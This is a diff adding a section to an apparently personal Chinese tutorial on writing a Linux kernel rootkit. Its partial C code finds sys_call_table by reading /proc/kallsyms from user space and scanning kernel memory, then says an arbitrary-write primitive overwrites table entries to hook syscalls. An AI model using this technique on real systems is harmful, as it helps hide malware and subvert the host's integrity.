@@ -255,6 +255,70 @@ static size_t arbitrary_pte_write(void *dst, void *src, size_t size){
     return 0;
 }
 ```
+## hook
+### 系统表hook
+首先找到系统调用表
+`arch/x86/include/generated/asm/syscalls_64.h`
+我们可以通过内核代码调用`call_usermodehelper()`这个内核函数来调用用户态的程序
+这里我们可以让用户态程序读取`/proc/kallsyms`文件获取内容，然后总结一个特征，
+之后返回内核态来遍历整个内核寻找这个特征，找到之后就说明我们找到了内核系统调用表的地址了
+
+```c
+//用户态
+...
+    kallsyms_file = fopen("/proc/kallsyms", "r");
+    if(kallsyms_file < 0){
+        perror("fopen");
+        return 1;
+    }
+    while(syscall_count != 5){
+        fscanf(kallsyms_file, "%lx %c %100s", &kinfo.kaddr, &kinfo.type, kinfo.name);
+        if(!strcmp(kinfo.name, "__x64_sys_read")){
+            kern_seek_data[0] = kinfo.kaddr;
+            syscall_count++;
+        }else if(!strcmp(kinfo.name, "__x64_sys_write")){
+            kern_seek_data[1] = kinfo.kaddr;
+            syscall_count++;
+        }else if(!strcmp(kinfo.name, "__x64_sys_open")){
+            kern_seek_data[2] = kinfo.kaddr;
+            syscall_count++;
+        }else if(!strcmp(kinfo.name, "__x64_sys_close")){
+            kern_seek_data[3] = kinfo.kaddr;
+            syscall_count++;
+        }else if(!strcmp(kinfo.name, "__x64_sys_newstat")){
+            kern_seek_data[4] = kinfo.kaddr;
+            syscall_count++;
+        }
+    }
+...
+
+
+//内核态
+...
+    /* 调用用户态程序 */
+    /* UMH_WAIT_PROC这个标识符表示要等用户程序执行完毕 */
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    if(!get_syscall_data){
+        panic("failed to get the sycall data from userspace!");
+    }
+    for(size_t i = 0;; i++){
+        if(phys_mem[i+0] == syscall_table_data[0]
+        && phys_mem[i+1] == syscall_table_data[1]
+        && phys_mem[i+2] == syscall_table_data[2]
+        && phys_mem[i+3] == syscall_table_data[3]
+        ){
+            syscall_table_addr = (size_t)&(phys_mem[i]);
+            printk(KERN_INFO "[peiwithhao rootkit] sys_call_table founded at %lx", syscall_table_addr);
+            break;
+        }
+    }
+...
+```
+然后我们利用之前的任意写函数来改写该系统调用表的任意地址就可以达成hook
+
+
+
+
 
 # 参考
 [https://xz.aliyun.com/t/12439?time__1311=GqGxRQ0%3Dq7qxlxx2mDu0maqY5okqWwnwmD#toc-3](https://xz.aliyun.com/t/12439?time__1311=GqGxRQ0%3Dq7qxlxx2mDu0maqY5okqWwnwmD#toc-3)
